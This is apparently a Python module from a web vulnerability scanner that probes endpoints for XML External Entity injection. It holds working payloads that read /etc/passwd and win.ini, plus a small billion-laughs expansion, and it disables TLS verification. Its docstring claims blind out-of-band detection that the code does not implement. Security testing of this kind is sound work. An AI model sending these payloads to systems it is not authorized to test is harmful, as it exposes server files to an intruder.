"""
xxe_probe.py - XML External Entity (XXE) injection probe.

Injects XXE payloads into endpoints that accept XML content.
Detects both classic (file read) and blind (OOB) XXE indicators.
"""
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from modules.explain import get_explanation
from utils.logger import get_logger

log = get_logger(__name__)

# XXE payloads — classic file read attempt
XXE_PAYLOADS = [
    # Linux /etc/passwd read
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    # Windows equivalent
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    # Billion laughs (DoS indicator — small version)
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>',
]

# Indicators in response that suggest XXE worked
XXE_INDICATORS = [
    "root:x:",           # /etc/passwd
    "[extensions]",      # win.ini
    "daemon:x:",
    "/bin/bash",
    "/bin/sh",
]

XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/xhtml+xml",
]


def probe_xxe(endpoints, requester, explain=False):
    """
    Test endpoints that accept XML for XXE vulnerabilities.
    Returns a list of issue dicts.
    """
    issues = []

    for ep in endpoints:
        url = ep["url"]

        for payload in XXE_PAYLOADS:
            for ct in XML_CONTENT_TYPES:
                try:
                    resp = requester._session.post(
                        url,
                        data=payload,
                        headers={"Content-Type": ct},
                        timeout=10,
                        verify=False,
                        allow_redirects=False,
                    )
                    body = resp.text

                    for indicator in XXE_INDICATORS:
                        if indicator in body:
                            issue = {
                                "type": "XXE: XML External Entity Injection",
                                "endpoint": url,
                                "payload": payload[:80] + "...",
                                "risk": "Critical",
                                "detail": f"Response contains: '{indicator}'",
                                "confidence": "High",
                            }
                            if explain:
                                issue["reason"] = get_explanation("xxe")
                            issues.append(issue)
                            log.debug(f"XXE confirmed at {url}")
                            return issues  # one confirmed is enough

                except Exception:
                    pass

    return issues
